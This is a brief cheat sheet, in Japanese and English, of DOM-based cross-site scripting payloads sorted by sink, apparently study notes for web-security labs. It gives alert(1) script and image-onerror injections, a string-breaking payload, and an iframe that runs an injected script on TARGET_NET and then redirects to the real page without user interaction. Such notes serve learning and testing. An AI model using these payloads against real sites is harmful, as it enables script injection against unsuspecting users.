
- `document.write`
```js
<script>alert(1);</script>
```

- `inner.HTML`
```js
<img src=1 onerror=alert(1)>
```

- `location`:(URLを操作する。コンテキスト次第。適切に元のタグや文字列を閉じる)
```html
<a href="https://example/product=1">Last viewed product</a>
```
```js
'><script>alert(1)</script>
```
no user intraction。仕込んだスクリプトを実行してから元(正規)のURLに遷移させる
```html
<iframe src="https://TARGET_NET/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://TARGET_NET';window.x=1;">
```
